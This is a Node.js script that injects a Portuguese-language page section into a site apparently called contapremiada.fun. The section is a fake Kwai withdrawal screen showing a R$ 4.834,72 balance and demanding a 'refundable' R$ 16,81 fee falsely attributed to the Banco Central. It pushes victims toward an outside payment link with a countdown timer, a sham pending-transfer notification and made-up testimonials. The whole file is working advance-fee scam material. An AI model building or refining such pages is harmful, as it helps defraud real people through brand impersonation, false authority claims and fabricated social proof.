const fs = require('fs');

const htmlPath = 'c:/Meus Sites/KWAI/contapremiada.fun/index.html';
let html = fs.readFileSync(htmlPath, 'utf8');

const startStr = '<section id="nine"';
const endStr = '</section>';

const start = html.indexOf(startStr);
// Find the exact closing tag for section nine
const end = html.indexOf(endStr, start) + endStr.length;

if (start === -1 || html.indexOf(endStr, start) === -1) {
    console.error('Could not find <section id="nine"> or its closing tag.');
    process.exit(1);
}

const newHtml = `<section id="nine" class="screen" aria-hidden="true">
        <!-- Injetando Tailwind apenas para o section 9 -->
        <script src="https://cdn.tailwindcss.com"></script>
        <script>
            tailwind.config = {
                corePlugins: { preflight: false },
                theme: {
                    extend: {
                        colors: {
                            pink: '#FF5000', // Laranja do Kwai
                            foreground: '#000000',
                            'muted-foreground': '#6b7280',
                            background: '#F5F5F5',
                        }
                    }
                }
            }
        </script>
        <style>
            #nine .animate-pulse { animation: pulse 2s cubic-bezier(0.4,0,0.6,1) infinite; }
            @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: .5; } }
            @keyframes notifSlideDown { from { opacity: 0; transform: translateY(-20px) scale(0.95); } to { opacity: 1; transform: translateY(0) scale(1); } }
            @keyframes notifSlideUp { from { opacity: 1; transform: translateY(0) scale(1); } to { opacity: 0; transform: translateY(-20px) scale(0.95); } }
        </style>

        <div class="min-h-screen max-w-[430px] mx-auto pb-8 bg-[#F5F5F5] relative" style="font-family: 'Inter', sans-serif;">
            <!-- Notificação Kwai -->
            <div id="notification-banner" style="display:none; position:absolute; z-index:9999; top:12px; left:6px; right:6px;">
                <div style="background:#fff; border-radius:16px; padding:12px 14px; box-shadow:0 8px 32px rgba(0,0,0,0.18); max-width:28rem; margin:0 auto; display:flex; align-items:center; gap:10px; border:1px solid #e5e7eb;">
                    <img src="images/Logo-promo.webp" alt="Kwai" width="40" height="40" style="border-radius:10px; flex-shrink:0; object-fit:contain;">
                    <div style="flex:1; min-width:0;">
                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:2px;">
                            <span style="font-weight:700; font-size:14px; color:#111;">Transferência pendente</span>
                            <span style="font-size:12px; color:#9ca3af;">agora</span>
                        </div>
                        <p style="font-size:13px; color:#374151; margin:0; line-height:1.4;">Transferência no valor de <strong>R$ 4.834,72</strong> aguardando pagamento da taxa de liberação.</p>
                    </div>
                </div>
            </div>

            <!-- Header -->
            <header class="h-[56px] flex items-center justify-between px-4 bg-white sticky top-0 z-50 shadow-sm">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="cursor-pointer" onclick="history.back()">
                    <path d="m15 18-6-6 6-6"></path>
                </svg>
                <h1 class="font-bold text-[17px] text-foreground m-0">Confirmação de saque</h1>
                <div class="w-6"></div>
            </header>

            <!-- Timer -->
            <div class="flex items-center justify-center gap-2 py-2 bg-white border-b border-[#F0F0F0]">
                <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#FF5000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <circle cx="12" cy="12" r="10"></circle>
                    <polyline points="12 6 12 12 16 14"></polyline>
                </svg>
                <span class="text-[13px] text-muted-foreground">Tempo restante:</span>
                <span id="countdown-timer-new" class="text-[14px] font-bold text-pink" style="font-variant-numeric: tabular-nums">10:00</span>
            </div>

            <!-- Protocolo -->
            <div class="mx-4 mt-2 flex items-center justify-center">
                <p class="text-[#6b7280] opacity-60 text-[10px] m-0">
                    Protocolo: <span class="font-mono font-semibold">KW-2026-TIJ5AM</span>
                </p>
            </div>

            <!-- Card saldo -->
            <div class="mx-4 mt-2 relative">
                <div class="bg-foreground rounded-t-[16px] p-5 pb-5 relative overflow-hidden">
                    <p class="text-white opacity-80 text-[14px] m-0">Saldo disponível</p>
                    <p class="text-white text-[38px] font-extrabold leading-tight tracking-tight mt-1 mb-0" style="font-variant-numeric: tabular-nums">
                        R$ 4.834,72
                    </p>
                    <p class="text-white opacity-60 text-[13px] m-0 mt-1">Aguardando confirmação para saque</p>
                    <img src="images/p-saldo-maior.png" alt="P" width="90" height="90" class="absolute right-4 top-3" style="width:90px;height:90px;object-fit:contain;">
                </div>
                <div class="relative bg-foreground">
                    <div class="absolute left-0 top-1/2 -translate-y-1/2 -translate-x-1/2 w-[20px] h-[20px] rounded-full bg-[#F5F5F5]"></div>
                    <div class="absolute right-0 top-1/2 -translate-y-1/2 translate-x-1/2 w-[20px] h-[20px] rounded-full bg-[#F5F5F5]"></div>
                    <div class="border-t-[2px] border-dashed border-white opacity-20 mx-5"></div>
                </div>
                <div class="bg-foreground rounded-b-[16px] px-5 py-3 flex items-center justify-between">
                    <span class="text-white opacity-70 text-[13px]">Suas transações: R$ 0,03</span>
                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="opacity:0.7; transform:rotate(180deg)">
                        <path d="m15 18-6-6 6-6"></path>
                    </svg>
                </div>
            </div>

            <!-- Contribuição de segurança -->
            <div class="mx-4 mt-4 bg-white rounded-[16px] p-5">
                <p class="text-muted-foreground text-[12px] uppercase tracking-wide font-bold mb-3 m-0">
                    Contribuição de segurança
                </p>
                <div class="flex items-center gap-3 mb-3">
                    <span class="text-[#10B981] text-[28px] font-extrabold">R$ 16,81</span>
                    <span class="text-[#10B981] text-[11px] font-bold border border-[#10B981] rounded-full px-2.5 py-0.5 animate-pulse">100% REEMBOLSÁVEL</span>
                </div>
                <p class="text-muted-foreground text-[14px] leading-relaxed m-0">
                    Contribuição de segurança exigida pelo Banco Central para liberação do saque de
                    <strong class="text-foreground">R$ 4.834,72</strong>. O valor de
                    <strong class="text-foreground">R$ 16,81</strong> será devolvido integralmente na sua chave Pix em 1 minuto.
                </p>
                <div class="mt-3 bg-[#F9FAFB] rounded-[10px] p-3 space-y-1.5">
                    <p class="text-muted-foreground text-[10px] uppercase tracking-wider font-bold mb-1 m-0">Composição da taxa</p>
                    <div class="flex items-center justify-between">
                        <span class="text-muted-foreground text-[12px]">Validação BCB</span>
                        <span class="text-foreground text-[12px] font-semibold">R$ 2,50</span>
                    </div>
                    <div class="flex items-center justify-between">
                        <span class="text-muted-foreground text-[12px]">Seguro antifraude</span>
                        <span class="text-foreground text-[12px] font-semibold">R$ 14,31</span>
                    </div>
                    <div class="border-t border-[#E5E7EB] pt-1.5 mt-2 flex items-center justify-between">
                        <span class="text-foreground text-[12px] font-bold">Total (reembolsável)</span>
                        <span class="text-[#10B981] text-[12px] font-bold">R$ 16,81</span>
                    </div>
                </div>
            </div>

            <!-- Botão confirmar -->
            <div class="mx-4 mt-4 bg-white rounded-[16px] p-5">
                <a href="https://seguropagamentos.com.br/kwaibrasil" id="btn-gerar-pix" target="_self" class="w-full h-[56px] bg-pink text-white font-bold text-[16px] rounded-[14px] flex items-center justify-center gap-2 no-underline" style="box-shadow:0 4px 14px rgba(255,80,0,0.3); text-decoration:none;">
                    <svg xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <rect width="18" height="11" x="3" y="11" rx="2" ry="2"></rect>
                        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                    </svg>
                    CONFIRMAR E LIBERAR R$ 4.834,72
                </a>
                <div class="flex items-center justify-center gap-1.5 mt-3">
                    <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#10B981" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <circle cx="12" cy="12" r="10"></circle>
                        <polyline points="12 6 12 12 16 14"></polyline>
                    </svg>
                    <span class="text-[#10B981] text-[13px] font-semibold">Reembolso de R$ 16,81 em 1 minuto</span>
                </div>
            </div>

            <!-- Passos -->
            <div class="mx-4 mt-4 bg-white rounded-[16px] p-4">
                <div class="flex items-center justify-between">
                    <div class="flex flex-col items-center flex-1">
                        <div class="w-[32px] h-[32px] rounded-full bg-pink flex items-center justify-center">
                            <span class="text-white text-[11px] font-bold">1</span>
                        </div>
                        <p class="text-foreground text-[10px] font-bold mt-1.5 text-center leading-tight m-0">Pagar<br>R$ 16,81</p>
                    </div>
                    <div class="h-[2px] bg-[#E5E7EB] flex-1 mx-1" style="margin-top:-16px"></div>
                    <div class="flex flex-col items-center flex-1">
                        <div class="w-[32px] h-[32px] rounded-full bg-[#E5E7EB] flex items-center justify-center">
                            <span class="text-muted-foreground text-[11px] font-bold">2</span>
                        </div>
                        <p class="text-muted-foreground text-[10px] mt-1.5 text-center leading-tight m-0">Reembolso<br>em 1 min</p>
                    </div>
                    <div class="h-[2px] bg-[#E5E7EB] flex-1 mx-1" style="margin-top:-16px"></div>
                    <div class="flex flex-col items-center flex-1">
                        <div class="w-[32px] h-[32px] rounded-full bg-[#E5E7EB] flex items-center justify-center">
                            <span class="text-muted-foreground text-[11px] font-bold">3</span>
                        </div>
                        <p class="text-muted-foreground text-[10px] mt-1.5 text-center leading-tight m-0">R$ 4.834,72<br>na conta</p>
                    </div>
                </div>
            </div>

            <!-- Dados para reembolso -->
            <div class="mx-4 mt-4 bg-white rounded-[16px] p-5">
                <p class="text-muted-foreground text-[12px] uppercase tracking-wide font-bold mb-4 m-0">Dados para reembolso</p>
                <div class="flex items-center justify-between py-3 border-b border-[#F0F0F0]">
                    <span class="text-muted-foreground text-[15px]">Data</span>
                    <span class="font-semibold text-[15px] text-foreground" id="data-hoje-new">28/03/2026</span>
                </div>
                <div class="flex items-center justify-between py-3 border-b border-[#F0F0F0]">
                    <span class="text-muted-foreground text-[15px]">Chave PIX</span>
                    <span id="pix-key-type-new" class="font-semibold text-[15px] text-foreground">Celular</span>
                </div>
                <div class="flex items-center justify-between py-3 border-b border-[#F0F0F0]">
                    <span class="text-muted-foreground text-[15px]">Valor a receber</span>
                    <span class="font-bold text-[15px] text-foreground">R$ 4.834,72</span>
                </div>
                <button id="pix-key-value-new" class="w-full h-[48px] bg-[#F0F0F0] text-foreground font-semibold text-[15px] rounded-[10px] mt-4 border-none">
                    (21) 98765-6787
                </button>
            </div>

            <div class="mx-4 my-4 border-t border-[#E5E7EB]"></div>

            <!-- Depoimentos -->
            <div class="mx-4 bg-white rounded-[16px] p-4 space-y-3">
                <p class="text-muted-foreground text-[11px] uppercase tracking-wider font-bold text-center mb-1 m-0">Quem já sacou hoje</p>

                <div class="flex gap-3 items-start py-2 border-b border-[#F0F0F0]">
                    <img src="https://globaldigital2026.shop/funil/assets/testimonial-lucas-DVva3n8g.jpeg" alt="Lucas M." class="w-[40px] h-[40px] rounded-full object-cover shrink-0">
                    <div class="flex-1 min-w-0">
                        <div class="flex items-center justify-between">
                            <span class="text-foreground text-[13px] font-semibold">Lucas M.</span>
                            <span class="text-[#10B981] text-[11px] font-bold">R$ 2.800 ✓</span>
                        </div>
                        <p class="text-foreground text-[12px] italic leading-snug mt-0.5 m-0">"paguei achando q era cilada kkk mas o reembolso veio antes do saque, nunca mais duvido"</p>
                        <p class="text-muted-foreground text-[10px] mt-0.5 m-0">São Paulo · há 12 min</p>
                    </div>
                </div>

                <div class="flex gap-3 items-start py-2 border-b border-[#F0F0F0]">
                    <img src="https://globaldigital2026.shop/funil/assets/testimonial-amanda-DWOXdEcF.jpeg" alt="Amanda S." class="w-[40px] h-[40px] rounded-full object-cover shrink-0">
                    <div class="flex-1 min-w-0">
                        <div class="flex items-center justify-between">
                            <span class="text-foreground text-[13px] font-semibold">Amanda S.</span>
                            <span class="text-[#10B981] text-[11px] font-bold">R$ 1.450 ✓</span>
                        </div>
                        <p class="text-foreground text-[12px] italic leading-snug mt-0.5 m-0">"gente eu tava morrendo de medo mas fiz e caiu certinho, obrigada kwai por essa oportunidade serio"</p>
                        <p class="text-muted-foreground text-[10px] mt-0.5 m-0">Rio de Janeiro · há 28 min</p>
                    </div>
                </div>

                <div class="flex gap-3 items-start py-2 border-b border-[#F0F0F0]">
                    <img src="https://globaldigital2026.shop/funil/assets/testimonial-rafael-CZLwIeTm.jpeg" alt="Rafael O." class="w-[40px] h-[40px] rounded-full object-cover shrink-0">
                    <div class="flex-1 min-w-0">
                        <div class="flex items-center justify-between">
                            <span class="text-foreground text-[13px] font-semibold">Rafael O.</span>
                            <span class="text-[#10B981] text-[11px] font-bold">R$ 3.200 ✓</span>
                        </div>
                        <p class="text-foreground text-[12px] italic leading-snug mt-0.5 m-0">"terceira vez sacando ja, toda vez cai em menos de 2 min, nao tem erro nenhum"</p>
                        <p class="text-muted-foreground text-[10px] mt-0.5 m-0">Belo Horizonte · há 43 min</p>
                    </div>
                </div>

                <div class="flex gap-3 items-start py-2">
                    <img src="https://globaldigital2026.shop/funil/assets/testimonial-carla-Fb5od0Tc.jpeg" alt="Carla F." class="w-[40px] h-[40px] rounded-full object-cover shrink-0">
                    <div class="flex-1 min-w-0">
                        <div class="flex items-center justify-between">
                            <span class="text-foreground text-[13px] font-semibold">Carla F.</span>
                            <span class="text-[#10B981] text-[11px] font-bold">R$ 980 ✓</span>
                        </div>
                        <p class="text-foreground text-[12px] italic leading-snug mt-0.5 m-0">"quase nao fiz por causa da taxa mas devolveram tao rapido q nem deu tempo de me arrepender kkk"</p>
                        <p class="text-muted-foreground text-[10px] mt-0.5 m-0">Curitiba · há 1h</p>
                    </div>
                </div>

                <div class="flex items-center justify-center gap-1.5 pt-1 mt-2">
                    <div class="flex" style="gap:-8px">
                        <img src="https://globaldigital2026.shop/funil/assets/social-proof-1-wtJu8RKO.jpeg" alt="" loading="lazy" class="w-[22px] h-[22px] rounded-full object-cover border-2 border-white" style="margin-right:-6px">
                        <img src="https://globaldigital2026.shop/funil/assets/social-proof-2-Bexutqu7.jpeg" alt="" loading="lazy" class="w-[22px] h-[22px] rounded-full object-cover border-2 border-white" style="margin-right:-6px">
                        <img src="https://globaldigital2026.shop/funil/assets/social-proof-3-CQJriiT6.jpeg" alt="" loading="lazy" class="w-[22px] h-[22px] rounded-full object-cover border-2 border-white" style="margin-right:-6px">
                        <img src="https://globaldigital2026.shop/funil/assets/social-proof-4-rJbdLVAM.jpeg" alt="" loading="lazy" class="w-[22px] h-[22px] rounded-full object-cover border-2 border-white">
                    </div>
                    <span class="text-muted-foreground text-[11px] ml-2">+8.432 saques confirmados hoje</span>
                </div>
            </div>

            <!-- Botão confirmar 2 -->
            <div class="mx-4 mt-4 bg-white rounded-[16px] p-5">
                <a href="https://seguropagamentos.com.br/kwaibrasil" target="_self" class="w-full h-[56px] bg-pink text-white font-bold text-[16px] rounded-[14px] flex items-center justify-center gap-2 no-underline" style="box-shadow:0 4px 14px rgba(255,80,0,0.3); text-decoration:none;">
                    <svg xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <rect width="18" height="11" x="3" y="11" rx="2" ry="2"></rect>
                        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                    </svg>
                    CONFIRMAR E LIBERAR R$ 4.834,72
                </a>
                <div class="flex items-center justify-center gap-1.5 mt-3">
                    <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#10B981" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <circle cx="12" cy="12" r="10"></circle>
                        <polyline points="12 6 12 12 16 14"></polyline>
                    </svg>
                    <span class="text-[#10B981] text-[13px] font-semibold">Reembolso de R$ 16,81 em 1 minuto</span>
                </div>
            </div>

            <!-- Rodapé -->
            <div class="mx-4 mt-4 border-t border-[#E5E7EB] pt-4 pb-6">
                <p class="text-muted-foreground text-[13px] text-center m-0">Processo 100% seguro</p>
                <p class="text-muted-foreground text-[9px] text-center mt-1 opacity-50 m-0">Protocolo KW-2026-TIJ5AM</p>
                <p class="text-pink text-[13px] text-center font-semibold mt-1 cursor-pointer m-0">Precisa de ajuda?</p>
            </div>

            <script>
                (function() {
                    var k = 'countdown_end_time_new';
                    var d = 10 * 60 * 1000;
                    var e = parseInt(sessionStorage.getItem(k));
                    if (!e || e < Date.now()) {
                        e = Date.now() + d;
                        sessionStorage.setItem(k, e);
                    }
                    var t = document.getElementById('countdown-timer-new');
                    function u() {
                        var r = Math.max(0, e - Date.now());
                        var m = Math.floor(r / 60000);
                        var s = Math.floor((r % 60000) / 1000);
                        if(t) t.textContent = (m < 10 ? '0' : '') + m + ':' + (s < 10 ? '0' : '') + s;
                        if (r > 0) setTimeout(u, 1000);
                    }
                    u();
                })();

                var hoje = new Date();
                var elmData = document.getElementById('data-hoje-new');
                if(elmData) {
                    elmData.textContent =
                    String(hoje.getDate()).padStart(2,'0') + '/' +
                    String(hoje.getMonth()+1).padStart(2,'0') + '/' +
                    hoje.getFullYear();
                }

                setTimeout(function() {
                    var n = document.getElementById('notification-banner');
                    if(n) {
                        n.style.display = 'block';
                        n.style.animation = 'notifSlideDown 0.4s cubic-bezier(0.16,1,0.3,1) forwards';
                        setTimeout(function() {
                            n.style.animation = 'notifSlideUp 0.4s cubic-bezier(0.16,1,0.3,1) forwards';
                            setTimeout(function() { n.style.display = 'none'; }, 400);
                        }, 5000);
                    }
                }, 2000);
            </script>
        </div>
    </section>`;

html = html.substring(0, start) + newHtml + html.substring(end);
fs.writeFileSync(htmlPath, html, 'utf8');
console.log('Update successful!');
